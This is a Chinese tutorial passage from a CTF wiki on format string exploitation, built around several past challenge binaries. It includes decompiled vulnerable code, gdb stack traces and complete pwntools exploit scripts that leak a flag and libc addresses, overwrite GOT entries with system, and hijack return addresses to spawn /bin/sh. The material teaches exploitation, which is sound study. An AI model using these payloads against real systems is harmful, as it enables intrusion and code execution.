
---
ingested: true
ingestedAt: 2026-05-16
---
# 例子

下面会介绍一些 CTF 中的格式化漏洞的题目。也都是格式化字符串常见的利用。

## 64 位程序格式化字符串漏洞 

### 原理 

其实 64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中的。那么在格式化字符串漏洞中呢？虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。

### 例子 

这里，我们以 2017 年的 UIUCTF 中 [pwn200 GoodLuck](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/2017-UIUCTF-pwn200-GoodLuck) 为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个 flag.txt 文件。

#### 确定保护 

```
➜  2017-UIUCTF-pwn200-GoodLuck git:(master) ✗ checksec goodluck
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
可以看出程序开启了 NX 保护以及部分 RELRO 保护。

#### 分析程序 

可以发现，程序的漏洞很明显

```
  for ( j = 0; j &lt;= 21; ++j )
  {
    v5 = format[j];
    if ( !v5 || v11[j] != v5 )
    {
      puts("You answered:");
      printf(format);
      puts("\nBut that was totally wrong lol get rekt");
      fflush(_bss_start);
      result = 0;
      goto LABEL_11;
    }
  }
```
#### 确定偏移 

我们在 printf 处下偏移如下, 这里只关注代码部分与栈部分。

```
gef➤  b printf
Breakpoint 1 at 0x400640
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck 
what's the flag
123456
You answered:

Breakpoint 1, __printf (format=0x602830 "123456") at printf.c:28
28 printf.c: 没有那个文件或目录.

─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
 0x7ffff7a627f7 &lt;fprintf+135&gt; add rsp, 0xd8
 0x7ffff7a627fe &lt;fprintf+142&gt; ret 
 0x7ffff7a627ff nop 
 → 0x7ffff7a62800 &lt;printf+0&gt; sub rsp, 0xd8
 0x7ffff7a62807 &lt;printf+7&gt; test al, al
 0x7ffff7a62809 &lt;printf+9&gt; mov QWORD PTR [rsp+0x28], rsi
 0x7ffff7a6280e &lt;printf+14&gt; mov QWORD PTR [rsp+0x30], rdx
───────────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffdb08', 'l8']
8
0x00007fffffffdb08│+0x00: 0x0000000000400890  →  &lt;main+234&gt; mov edi, 0x4009b8    ← $rsp
0x00007fffffffdb10│+0x08: 0x0000000031000001
0x00007fffffffdb18│+0x10: 0x0000000000602830  →  0x0000363534333231 ("123456"?)
0x00007fffffffdb20│+0x18: 0x0000000000602010  →  "You answered:\ng"
0x00007fffffffdb28│+0x20: 0x00007fffffffdb30  →  "flag{11111111111111111"
0x00007fffffffdb30│+0x28: "flag{11111111111111111"
0x00007fffffffdb38│+0x30: "11111111111111"
0x00007fffffffdb40│+0x38: 0x0000313131313131 ("111111"?)
──────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7a62800 → Name: __printf(format=0x602830 "123456")
[#1] 0x400890 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────
```
可以看到 flag 对应的栈上的偏移为 5，除去对应的第一行为返回地址外，其偏移为 4。此外，由于这是一个 64 位程序，所以前 6 个参数存在在对应的寄存器中，fmt 字符串存储在 RDI 寄存器中，所以 fmt 字符串对应的地址的偏移为 10。而 fmt 字符串中 `%order$s` 对应的 order 为 fmt 字符串后面的参数的顺序，所以我们只需要输入 `%9$s` 即可得到 flag 的内容。当然，我们还有更简单的方法利用 [https://github.com/scwuaptx/Pwngdb](https://github.com/scwuaptx/Pwngdb) 中的 fmtarg 来判断某个参数的偏移。

```
gef➤  fmtarg 0x00007fffffffdb28
The index of format argument : 10
```
需要注意的是我们必须 break 在 printf 处。

#### 利用程序 

```
from pwn import *
from LibcSearcher import *
goodluck = ELF('./goodluck')
if args['REMOTE']:
    sh = remote('pwn.sniperoj.cn', 30017)
else:
    sh = process('./goodluck')
payload = "%9$s"
print payload
##gdb.attach(sh)
sh.sendline(payload)
print sh.recv()
sh.interactive()
```
## hijack GOT

### 原理 

在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。

假设我们将函数 A 的地址覆盖为函数 B 的地址，那么这一攻击技巧可以分为以下步骤

- 确定函数 A 的 GOT 表地址。

    - 这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。

- 确定函数 B 的内存地址

    - 这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。

- 将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。

    - 这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种

        - 写入函数：write 函数。

        - ROP

```
pop eax; ret; # printf@got -&gt; eax
pop ebx; ret; # (addr_offset = system_addr - printf_addr) -&gt; ebx
add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset
```
        - 格式化字符串任意地址写

### 例子 

这里我们以 2016 CCTF 中的 [pwn3](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/2016-CCTF-pwn3) 为例进行介绍。

#### 确定保护 

如下

```
➜  2016-CCTF-pwn3 git:(master) ✗ checksec pwn3 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
可以看出程序主要开启了 NX 保护。我们一般默认远程都是开启 ASLR 保护的。

#### 分析程序 

首先分析程序，可以发现程序似乎主要实现了一个需密码登录的 ftp，具有 get，put，dir 三个基本功能。大概浏览一下每个功能的代码，发现在 get 功能中存在格式化字符串漏洞

```
int get_file()
{
  char dest; // [sp+1Ch] [bp-FCh]@5
  char s1; // [sp+E4h] [bp-34h]@1
  char *i; // [sp+10Ch] [bp-Ch]@3

  printf("enter the file name you want to get:");
  __isoc99_scanf("%40s", &amp;s1);
  if ( !strncmp(&amp;s1, "flag", 4u) )
    puts("too young, too simple");
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
  {
    if ( !strcmp(i, &amp;s1) )
    {
      strcpy(&amp;dest, i + 0x28);
      return printf(&amp;dest);
    }
  }
  return printf(&amp;dest);
}
```
#### 漏洞利用思路 

既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路

- 绕过密码

- 确定格式化字符串参数偏移

- 利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。

- 修改 puts@got 的内容为 system 的地址。

- 当程序再次执行 puts 函数的时候，其实执行的是 system 函数。

#### 漏洞利用程序 

如下

```
from pwn import *
from LibcSearcher import LibcSearcher
##context.log_level = 'debug'
pwn3 = ELF('./pwn3')
if args['REMOTE']:
    sh = remote('111', 111)
else:
    sh = process('./pwn3')

def get(name):
    sh.sendline('get')
    sh.recvuntil('enter the file name you want to get:')
    sh.sendline(name)
    data = sh.recv()
    return data

def put(name, content):
    sh.sendline('put')
    sh.recvuntil('please enter the name of the file you want to upload:')
    sh.sendline(name)
    sh.recvuntil('then, enter the content:')
    sh.sendline(content)

def show_dir():
    sh.sendline('dir')

tmp = 'sysbdmin'
name = ""
for i in tmp:
    name += chr(ord(i) - 1)

## password
def password():
    sh.recvuntil('Name (ftp.hacker.server:Rainism):')
    sh.sendline(name)

##password
password()
## get the addr of puts
puts_got = pwn3.got['puts']
log.success('puts got : ' + hex(puts_got))
put('1111', '%8$s' + p32(puts_got))
puts_addr = u32(get('1111')[:4])

## get addr of system
libc = LibcSearcher("puts", puts_addr)
system_offset = libc.dump('system')
puts_offset = libc.dump('puts')
system_addr = puts_addr - puts_offset + system_offset
log.success('system addr : ' + hex(system_addr))

## modify puts@got, point to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr})
put('/bin/sh;', payload)
sh.recvuntil('ftp&gt;')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
##gdb.attach(sh)
sh.sendline('/bin/sh;')

## system('/bin/sh')
show_dir()
sh.interactive()
```
注意

- 我在获取 puts 函数地址时使用的偏移是 8，这是因为我希望我输出的前 4 个字节就是 puts 函数的地址。其实格式化字符串的首地址的偏移是 7。

- 这里我利用了 pwntools 中的 fmtstr_payload 函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里 fmtstr_payload(7, {puts_got: system_addr}) 的意思就是，我的格式化字符串的偏移是 7，我希望在 puts_got 地址处写入 system_addr 地址。默认情况下是按照字节来写的。

## hijack retaddr

### 原理 

很容易理解，我们要利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。

### 例子 

这里我们以 [三个白帽 - pwnme_k0](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0) 为例进行分析。

#### 确定保护 

```
➜  三个白帽-pwnme_k0 git:(master) ✗ checksec pwnme_k0
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
可以看出程序主要开启了 NX 保护以及 Full RELRO 保护。这我们就没有办法修改程序的 got 表了。

#### 分析程序 

简单分析一下，就知道程序似乎主要实现了一个类似账户注册之类的功能，主要有修改查看功能，然后发现在查看功能中发现了格式化字符串漏洞

```
int __usercall sub_400B07@&lt;eax&gt;(char format@&lt;dil&gt;, char formata, __int64 a3, char a4)
{
  write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);
  printf(&amp;formata, "Welc0me to sangebaimao!\n");
  return printf(&amp;a4 + 4);
}
```
其输出的内容为 &amp;a4 + 4。我们回溯一下，发现我们读入的 password 内容也是

```
    v6 = read(0, (char *)&amp;a4 + 4, 0x14uLL);
```
当然我们还可以发现 username 和 password 之间的距离为 20 个字节。

```
  puts("Input your username(max lenth:20): ");
  fflush(stdout);
  v8 = read(0, &amp;bufa, 0x14uLL);
  if ( v8 &amp;&amp; v8 &lt;= 0x14u )
  {
    puts("Input your password(max lenth:20): ");
    fflush(stdout);
    v6 = read(0, (char *)&amp;a4 + 4, 0x14uLL);
    fflush(stdout);
    *(_QWORD *)buf = bufa;
    *(_QWORD *)(buf + 8) = a3;
    *(_QWORD *)(buf + 16) = a4;
```
好，这就差不多了。此外，也可以发现这个账号密码其实没啥配对不配对的。

#### 利用思路 

我们最终的目的是希望可以获得系统的 shell，可以发现在给定的文件中，在 0x00000000004008A6 地址处有一个直接调用 system('bin/sh') 的函数（关于这个的发现，一般都会现在程序大致看一下。）。那如果我们修改某个函数的返回地址为这个地址，那就相当于获得了 shell。

虽然存储返回地址的内存本身是动态变化的，但是其相对于 rbp 的地址并不会改变，所以我们可以使用相对地址来计算。利用思路如下

- 确定偏移

- 获取函数的 rbp 与返回地址

- 根据相对偏移获取存储返回地址的地址

- 将执行 system 函数调用的地址写入到存储返回地址的地址。

#### 确定偏移 

首先，我们先来确定一下偏移。输入用户名 aaaaaaaa，密码随便输入，断点下在输出密码的那个 printf(&amp;a4 + 4) 函数处

```
Register Account first!
Input your username(max lenth:20): 
aaaaaaaa
Input your password(max lenth:20): 
%p%p%p%p%p%p%p%p%p%p
Register Success!!
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
&gt;error options
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
&gt;1
...
```
此时栈的情况为

```
─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
 0x400b1a call 0x400758
 0x400b1f lea rdi, [rbp+0x10]
 0x400b23 mov eax, 0x0
 → 0x400b28 call 0x400770
 ↳ 0x400770 jmp QWORD PTR [rip+0x20184a] # 0x601fc0
 0x400776 xchg ax, ax
 0x400778 jmp QWORD PTR [rip+0x20184a] # 0x601fc8
 0x40077e xchg ax, ax
────────────────────────────────────────────────────────────────────[ stack ]────
0x00007fffffffdb40│+0x00: 0x00007fffffffdb80 → 0x00007fffffffdc30 → 0x0000000000400eb0 → push r15 ← $rsp, $rbp
0x00007fffffffdb48│+0x08: 0x0000000000400d74 → add rsp, 0x30
0x00007fffffffdb50│+0x10: "aaaaaaaa" ← $rdi
0x00007fffffffdb58│+0x18: 0x000000000000000a
0x00007fffffffdb60│+0x20: 0x7025702500000000
0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
0x00007fffffffdb78│+0x38: 0x0000000000400d4d → cmp eax, 0x2
```
可以发现我们输入的用户名在栈上第三个位置，那么除去本身格式化字符串的位置，其偏移为为 5 + 3 = 8。

#### 修改地址 

我们再仔细观察下断点处栈的信息

```
0x00007fffffffdb40│+0x00: 0x00007fffffffdb80 → 0x00007fffffffdc30 → 0x0000000000400eb0 → push r15 ← $rsp, $rbp
0x00007fffffffdb48│+0x08: 0x0000000000400d74 → add rsp, 0x30
0x00007fffffffdb50│+0x10: "aaaaaaaa" ← $rdi
0x00007fffffffdb58│+0x18: 0x000000000000000a
0x00007fffffffdb60│+0x20: 0x7025702500000000
0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
0x00007fffffffdb78│+0x38: 0x0000000000400d4d → cmp eax, 0x2
```
可以看到栈上第二个位置存储的就是该函数的返回地址 (其实也就是调用 show account 函数时执行 push rip 所存储的值)，在格式化字符串中的偏移为 7。

与此同时栈上，第一个元素存储的也就是上一个函数的 rbp。所以我们可以得到偏移 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38。继而如果我们知道了 rbp 的数值，就知道了函数返回地址的地址。

0x0000000000400d74 与 0x00000000004008A6 只有低 2 字节不同，所以我们可以只修改 0x00007fffffffdb48 开始的 2 个字节。

这里需要说明的是在某些较新的系统 (如 ubuntu 18.04) 上, 直接修改返回地址为 0x00000000004008A6 时可能会发生程序 crash, 这时可以考虑修改返回地址为 0x00000000004008AA, 即直接调用 system("/bin/sh") 处

```
.text:00000000004008A6 sub_4008A6 proc near
.text:00000000004008A6 ; __unwind {
.text:00000000004008A6 push rbp
.text:00000000004008A7 mov rbp, rsp
.text:00000000004008AA &lt;- here mov edi, offset command ; "/bin/sh"
.text:00000000004008AF call system
.text:00000000004008B4 pop rdi
.text:00000000004008B5 pop rsi
.text:00000000004008B6 pop rdx
.text:00000000004008B7 retn
```
#### 利用程序 

```
from pwn import *
context.log_level="debug"
context.arch="amd64"

sh=process("./pwnme_k0")
binary=ELF("pwnme_k0")
#gdb.attach(sh)

sh.recv()
sh.writeline("1"*8)
sh.recv()
sh.writeline("%6$p")
sh.recv()
sh.writeline("1")
sh.recvuntil("0x")
ret_addr = int(sh.recvline().strip(),16) - 0x38
success("ret_addr:"+hex(ret_addr))

sh.recv()
sh.writeline("2")
sh.recv()
sh.sendline(p64(ret_addr))
sh.recv()
#sh.writeline("%2214d%8$hn")
#0x4008aa-0x4008a6
sh.writeline("%2218d%8$hn")

sh.recv()
sh.writeline("1")
sh.recv()
sh.interactive()
```
## 堆上的格式化字符串漏洞 

### 原理 

所谓堆上的格式化字符串指的是格式化字符串本身存储在堆上，这个主要增加了我们获取对应偏移的难度，而一般来说，该格式化字符串都是很有可能被复制到栈上的。

### 例子 

这里我们以 2015 年 CSAW 中的 [contacts](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/2015-CSAW-contacts) 为例进行介绍。

#### 确定保护 

```
➜  2015-CSAW-contacts git:(master) ✗ checksec contacts
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
可以看出程序不仅开启了 NX 保护还开启了 Canary。

#### 分析程序 

简单看看程序，发现程序正如名字所描述的，是一个联系人相关的程序，可以实现创建，修改，删除，打印联系人的信息。而再仔细阅读，可以发现在打印联系人信息的时候存在格式化字符串漏洞。

```
int __cdecl PrintInfo(int a1, int a2, int a3, char *format)
{
  printf("\tName: %s\n", a1);
  printf("\tLength %u\n", a2);
  printf("\tPhone #: %s\n", a3);
  printf("\tDescription: ");
  return printf(format);
}
```
仔细看看，可以发现这个 format 其实是指向堆中的。

#### 利用思路 

我们的基本目的是获取系统的 shell，从而拿到 flag。其实既然有格式化字符串漏洞，我们应该是可以通过劫持 got 表或者控制程序返回地址来控制程序流程。但是这里却不怎么可行。原因分别如下

- 之所以不能够劫持 got 来控制程序流程，是因为我们发现对于程序中常见的可以对于我们给定的字符串输出的只有 printf 函数，我们只有选择它才可以构造 /bin/sh 让它执行 system('/bin/sh')，但是 printf 函数在其他地方也均有用到，这样做会使得程序直接崩溃。

- 其次，不能够直接控制程序返回地址来控制程序流程的是因为我们并没有一块可以直接执行的地址来存储我们的内容，同时利用格式化字符串来往栈上直接写入 system_addr + 'bbbb' + addr of '/bin/sh' 似乎并不现实。

那么我们可以怎么做呢？我们还有之前在栈溢出讲的技巧，stack pivoting。而这里，我们可以控制的恰好是堆内存，所以我们可以把栈迁移到堆上去。这里我们通过 leave 指令来进行栈迁移，所以在迁移之前我们需要修改程序保存 ebp 的值为我们想要的值。
